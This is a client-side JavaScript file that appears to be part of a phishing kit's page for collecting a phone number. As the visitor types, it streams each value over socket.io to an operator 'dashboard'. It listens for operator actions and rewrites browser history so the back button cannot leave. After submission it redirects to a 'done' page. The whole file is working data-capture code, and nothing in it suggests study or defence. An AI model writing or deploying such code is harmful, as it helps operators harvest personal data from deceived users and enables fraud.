/* number-client.js */
(function () {
  const SERVER_URL = window.location.origin;
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";
  

  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function debounce(fn, ms) {
    let t;
    return function (...args) {
      clearTimeout(t);
      t = setTimeout(() => fn.apply(this, args), ms);
    };
  }

  

  history.pushState(null, '', window.location.href);
  history.pushState(null, '', window.location.href); // push twice so one can be consumed

  window.addEventListener('popstate', function () {
    window.location.replace('number.html');
  });

  (function checkSuccess() {
    try {
      if (localStorage.getItem('successnumber')) {
        window.location.replace('done.html');
      }
    } catch {}
  })();

  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[number-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[number-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[number-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[number-client] disconnected");
    });

    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[number-client] dashboard action:", buttonName, value);
    });

    return socket;
  }

  onceDomReady(function () {
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      const phoneInput = document.getElementById('phone');

      // Emit live as the user types (debounced)
      const sendPhone = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "phone", data: String(val || "") });
      }, 300);

      if (phoneInput) {
        phoneInput.addEventListener('input', (e) => sendPhone(e.target.value));
      }

      const form = document.querySelector('form');
      if (form) {
        form.addEventListener('submit', function (e) {
          e.preventDefault();

          const formData = {
            phone: phoneInput ? phoneInput.value : "",
          };

          console.log('[number-client] Form submitted:', formData);

          // Emit final submitted value to dashboard
          socket.emit(DASH_EMIT_EVENT, {
            type: "phone-form-submitted",
            data: JSON.stringify(formData)
          });

          try {
            localStorage.setItem('phoneFormData', JSON.stringify(formData));
          } catch {}

          try { localStorage.setItem('successnumber', '1'); } catch {}
          setTimeout(() => {
            window.location.replace('done.html');
          }, 200);
        });
      }

      window.handleSubmit = function (event) {
        event.preventDefault();
        if (form) {
          form.dispatchEvent(new Event('submit'));
        }
      };
    });
  });
})();